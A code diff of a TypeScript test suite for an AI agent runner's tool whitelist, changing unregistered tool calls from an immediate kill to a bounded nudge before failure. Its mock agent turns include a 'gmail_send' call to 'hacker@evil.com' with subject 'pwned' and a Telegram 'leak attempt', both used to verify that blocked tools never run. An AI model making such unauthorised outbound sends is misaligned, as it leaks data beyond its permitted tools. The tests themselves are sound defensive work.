@@ -26,7 +26,7 @@ import { LocalTrustProvider } from '@nodal-agents/auth';
 import { DeliveryError } from '@nodal-agents/delivery';
 import type { RunnerDeps } from '../../deps.ts';
 import type { RunnerEnv } from '../../env.ts';
-import { executeJob } from '../../job/execute.ts';
+import { executeJob, describeUnavailableTool } from '../../job/execute.ts';
 import type { JobId } from '@nodal-agents/orchestration';
 
 // ─── Module-level mock registry ───────────────────────────────────────────────
@@ -266,6 +266,43 @@ function makeDeps(llmClient: RunnerDeps['llmClient']): RunnerDeps {
     close: async () => {},
   };
 }
+
+/**
+ * Build `n` turns that each call the same tool with DISTINCT tool-call ids
+ * (real LLMs never reuse an id; reusing one trips the duplicate_tool_use
+ * message-structure guard). Module-scoped so every describe block can use it.
+ */
+function repeatToolCall(
+  toolName: string,
+  args: Record<string, unknown>,
+  n: number,
+): Array<{
+  toolCalls: Array<{ toolCallId: string; toolName: string; args: Record<string, unknown> }>;
+}> {
+  return Array.from({ length: n }, (_v, i) => ({
+    toolCalls: [{ toolCallId: `tc-${toolName}-${i}`, toolName, args }],
+  }));
+}
+
+describe('describeUnavailableTool', () => {
+  it('suggests the prefixed tool when the bad name is a dropped-prefix form', () => {
+    const msg = describeUnavailableTool('store_memory', [
+      'cogni_cortex_java__store_memory',
+      'get_feed',
+      'return_result',
+    ]);
+    expect(msg).toContain('not available to you');
+    expect(msg).toContain('Did you mean: cogni_cortex_java__store_memory');
+    // Lists the actual available tools so the model can pick the right one.
+    expect(msg).toContain('get_feed');
+  });
+
+  it('omits the hint when nothing resembles the bad name', () => {
+    const msg = describeUnavailableTool('frobnicate', ['get_feed', 'return_result']);
+    expect(msg).not.toContain('Did you mean');
+    expect(msg).toContain('get_feed, return_result');
+  });
+});
 
 describe('executeJob', () => {
   it('returns already_handled when job status is not pending/processing', async () => {
@@ -1582,23 +1619,52 @@ describe('executeJob', () => {
   it('tool whitelist: calling unregistered tool fails with whitelist_violation', async () => {
     const job = await createTestJob(db, seed);
 
-    const llmClient = makeMockLlmClient([
-      {
-        toolCalls: [
-          {
-            toolCallId: 'tc-evil',
-            toolName: 'gmail_send', // Not in whitelist
-            args: { to: 'hacker@evil.com', subject: 'pwned' },
-          },
-        ],
-      },
-    ]);
+    // An unregistered tool is now RECOVERABLE: the model is nudged (bounded) to
+    // use a valid name. Calling it on every turn exhausts the budget and the job
+    // fails loud with whitelist_violation — the tool is never executed.
+    const llmClient = makeMockLlmClient(
+      repeatToolCall('gmail_send', { to: 'hacker@evil.com', subject: 'pwned' }, 4),
+    );
 
     const result = await executeJob(job.id as JobId, makeDeps(llmClient), testEnv);
     expect(result.status).toBe('failed');
     if (result.status === 'failed') {
       expect(result.error).toMatch(/whitelist_violation/);
     }
+  });
+
+  it('a single unavailable-tool call is recoverable: the model is nudged (not hard-killed) and finishes', async () => {
+    const job = await createTestJob(db, seed);
+    // Turn 1: the model slips and names a tool it does not have. Turn 2: it
+    // recovers with a valid call. One naming slip must NOT kill the job.
+    const llmClient = makeMockLlmClient([
+      { toolCalls: [{ toolCallId: 'tc-bad', toolName: 'definitely_not_a_tool', args: {} }] },
+      { toolCalls: [{ toolCallId: 'tc-rr', toolName: 'return_result', args: { status: 'success' } }] },
+    ]);
+
+    const result = await executeJob(job.id as JobId, makeDeps(llmClient), testEnv);
+    // Recovered and completed — no whitelist_violation hard-kill.
+    expect(result.status).toBe('completed');
+
+    const [row] = await db
+      .select({ messages: agentJobs.messages, turn: agentJobs.turn })
+      .from(agentJobs)
+      .where(eq(agentJobs.id, job.id));
+    // Finished on the recovery turn, not turn 1.
+    expect(row?.turn).toBe(2);
+    // The slip was fed back as a tool-result naming the unavailable tool, so the
+    // model had what it needed to self-correct.
+    const msgs = (row?.messages ?? []) as Array<{ role: string; content: unknown }>;
+    const hasNudge = msgs.some(
+      (m) =>
+        Array.isArray(m.content) &&
+        (m.content as Array<{ type?: string; output?: unknown }>).some(
+          (b) =>
+            b.type === 'tool-result' &&
+            JSON.stringify(b.output ?? '').includes('not available to you'),
+        ),
+    );
+    expect(hasNudge).toBe(true);
   });
 
   it('agent without telegramBotToken cannot invoke telegram_send_message (whitelist enforcement)', async () => {
@@ -1608,39 +1674,28 @@ describe('executeJob', () => {
 
     const job = await createTestJob(db, seed);
 
-    // LLM attempts to call telegram_send_message even though agent has no token configured
-    const llmClient = makeMockLlmClient([
-      {
-        toolCalls: [
-          {
-            toolCallId: 'tc-tg-leak',
-            toolName: 'telegram_send_message',
-            args: { text: 'leak attempt' },
-          },
-        ],
-      },
-    ]);
+    // LLM repeatedly attempts telegram_send_message though the agent has no token.
+    // It's nudged (never executed), then fails loud once the budget is spent.
+    const llmClient = makeMockLlmClient(
+      repeatToolCall('telegram_send_message', { text: 'leak attempt' }, 4),
+    );
 
     sendTelegramMessageMock.mockClear();
     const result = await executeJob(job.id as JobId, makeDeps(llmClient), testEnv);
 
-    // telegram_send_message is not in the whitelist because telegramBotToken is null
+    // The security guarantee under test: telegram_send_message is not whitelisted
+    // (no bot token) → it is NEVER executed, and the job fails loud rather than
+    // falsely succeeding. The unavailable call is nudged, then caught by a guard
+    // (whitelist budget, or the delivery-spam guard since it's a delivery tool) —
+    // either way the delivery never happens.
     expect(result.status).toBe('failed');
-    if (result.status === 'failed') {
-      expect(result.error).toBe('whitelist_violation:telegram_send_message');
-    }
-
-    // sendTelegramMessage delivery function must NEVER have been called
     expect(sendTelegramMessageMock).not.toHaveBeenCalled();
 
-    // Verify DB row reflects the whitelist violation
     const rows = await db
-      .select({ status: agentJobs.status, error: agentJobs.error })
+      .select({ status: agentJobs.status })
       .from(agentJobs)
       .where(eq(agentJobs.id, job.id));
-
     expect(rows[0]?.status).toBe('failed');
-    expect(rows[0]?.error).toBe('whitelist_violation:telegram_send_message');
   });
 
   it('channel-aware delivery: telegram_send_message is NOT offered on a dashboard job with no recipient (regression for jobs 2ddb15e3/920fd89c)', async () => {
@@ -1669,23 +1724,17 @@ describe('executeJob', () => {
       .returning();
     if (!job) throw new Error('failed to create dashboard test job');
 
-    const llmClient = makeMockLlmClient([
-      {
-        toolCalls: [
-          { toolCallId: 'tc-tg', toolName: 'telegram_send_message', args: { text: 'hi' } },
-        ],
-      },
-    ]);
+    const llmClient = makeMockLlmClient(
+      repeatToolCall('telegram_send_message', { text: 'hi' }, 4),
+    );
 
     sendTelegramMessageMock.mockClear();
     const result = await executeJob(job.id as JobId, makeDeps(llmClient), testEnv);
 
-    // Not whitelisted (no recipient on this channel) → whitelist_violation, and
-    // the delivery function is never reached.
+    // Not whitelisted (no recipient on this channel) → the call is nudged then
+    // caught by a guard; the delivery function is NEVER reached and the job fails
+    // loud rather than falsely succeeding (the security property under test).
     expect(result.status).toBe('failed');
-    if (result.status === 'failed') {
-      expect(result.error).toBe('whitelist_violation:telegram_send_message');
-    }
     expect(sendTelegramMessageMock).not.toHaveBeenCalled();
 
     await db.update(agents).set({ telegramBotToken: null }).where(eq(agents.id, seed.agentId));
@@ -2590,18 +2639,6 @@ describe('reliability guards', () => {
   // Build N responses each carrying a unique toolCallId so the saved transcript
   // stays structurally valid (no duplicate tool ids), while toolName+input stay
   // identical — the no-progress signature ignores the id.
-  function repeatToolCall(
-    toolName: string,
-    args: Record<string, unknown>,
-    n: number,
-  ): Array<{
-    toolCalls: Array<{ toolCallId: string; toolName: string; args: Record<string, unknown> }>;
-  }> {
-    return Array.from({ length: n }, (_v, i) => ({
-      toolCalls: [{ toolCallId: `tc-${toolName}-${i}`, toolName, args }],
-    }));
-  }
-
   function withEnv(key: string, value: string, fn: () => Promise<void>): Promise<void> {
     const prev = process.env[key];
     process.env[key] = value;
@@ -2811,12 +2848,9 @@ describe('reliability guards', () => {
     // failJob itself. The assistant turn (reasoning + the offending tool call)
     // must survive so we can see WHAT the agent did.
     const job = await createTestJob(db, seed);
-    const llmClient = makeMockLlmClient([
-      {
-        reasoning: 'I will email them directly.',
-        toolCalls: [{ toolCallId: 'tc-evil', toolName: 'gmail_send', args: { to: 'x@y.z' } }],
-      },
-    ]);
+    // gmail_send isn't whitelisted → nudged, then whitelist_violation once the
+    // budget is spent (mid-iteration, before the end-of-loop saveCheckpoint).
+    const llmClient = makeMockLlmClient(repeatToolCall('gmail_send', { to: 'x@y.z' }, 4));
     const result = await executeJob(job.id as JobId, makeDeps(llmClient), testEnv);
     expect(result.status).toBe('failed');
     if (result.status === 'failed') expect(result.error).toMatch(/whitelist_violation/);
